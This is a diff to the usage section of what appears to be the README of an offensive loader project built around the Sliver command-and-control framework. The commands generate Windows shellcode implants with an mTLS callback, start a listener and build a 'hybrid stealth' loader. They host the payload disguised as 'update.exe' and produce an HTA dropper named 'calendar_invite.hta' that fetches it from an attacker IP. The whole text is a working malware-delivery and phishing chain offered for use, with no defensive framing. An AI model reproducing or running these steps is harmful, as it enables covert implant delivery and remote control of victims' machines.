@@ -70,7 +70,9 @@ chmod +x hta_generator.py
 ```bash
 sliver > generate --mtls your-server:8888 --os windows --arch amd64 --format shellcode --save /opt/Sliver_Loader/sliver.bin
 sliver > mtls -L your-server -l 8888
-sliver > websites add-content --website mysite --web-path /download/update.exe --content /path/to/file/ACTUAL_FILENAME.exe --content-type application/octet-stream
+cd /opt/Sliver_Loader
+./build_hybrid_stealth.sh
+sliver > websites add-content --website mysite --web-path /download/update.exe --content /opt/Sliver_Loader/ACTUAL_FILENAME.exe --content-type application/octet-stream
 ./hta_generator.py -m 1 -H YOUR_IP/download/ -f update.exe -o calendar_invite.hta
 ```
 
